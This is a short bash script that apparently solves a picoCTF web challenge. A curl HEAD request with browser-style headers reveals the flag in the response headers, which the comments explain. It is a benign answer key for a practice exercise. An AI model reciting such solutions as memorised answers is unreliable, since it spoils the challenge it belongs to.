#!/bin/bash

# Looking through http://mercury.picoctf.net:15931/index.php and playing a bit with inspector, looking for similarities.
# The response change only in relation to HTTP Method. So I tried different method until I've found the flag in the response header.

curl --location --head 'http://mercury.picoctf.net:15931/index.php' \
--header 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
--header 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
--header 'Cache-Control: max-age=0' \
--header 'Connection: keep-alive' \
--header 'Content-Length: 0' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--header 'Origin: http://mercury.picoctf.net:15931' \
--header 'Referer: http://mercury.picoctf.net:15931/index.php?' \
--header 'Upgrade-Insecure-Requests: 1' \
--header 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'